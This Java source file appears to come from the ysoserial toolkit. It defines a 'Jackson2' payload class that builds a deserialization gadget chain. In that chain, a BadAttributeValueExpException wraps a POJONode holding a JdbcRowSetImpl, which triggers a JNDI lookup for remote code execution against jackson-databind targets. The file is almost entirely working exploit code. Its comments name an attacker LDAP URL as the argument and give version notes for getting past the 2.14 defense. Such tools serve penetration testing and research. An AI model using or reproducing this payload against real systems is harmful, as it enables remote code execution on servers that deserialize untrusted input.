package ysoserial.payloads;

import javax.management.BadAttributeValueExpException;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Jackson-databind JNDI variant via POJONode + JdbcRowSetImpl.

	Discovered by @Y4tacker. Jackson-databind research pioneered by @mbechler (marshalsec).

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				POJONode.toString()
					InternalNodeMapper.nodeToString()
						ObjectMapper.writeValueAsString()
							[getter invocation on JdbcRowSetImpl]
								JdbcRowSetImpl.getDatabaseMetaData()
									JdbcRowSetImpl.connect()
										InitialContext.lookup(dataSourceName)
											JNDI -> RCE

	vs Jackson1:
		- No TemplatesImpl needed (JDK 17+ friendly, no --add-opens)
		- JNDI sink instead of bytecode loading
		- Argument is a JNDI URL (ldap://attacker/Exploit)

	Note: jackson-databind 2.14+ added writeReplace() defense.
	Use < 2.14 for generation. Payload works on targets with any 2.x.

	Requires:
		jackson-databind 2.x (< 2.14 for generation)
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.12.7.1"})
@Authors({ Authors.Y4TACKER, Authors.MBECHLER })
public class Jackson2 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String jndiUrl) throws Exception {
		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiUrl);
		rs.setMatchColumn("foo"); // prevent NPE during serialization

		POJONode pojoNode = new POJONode(rs);

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(val, "val", pojoNode);

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jackson2.class, args);
	}
}
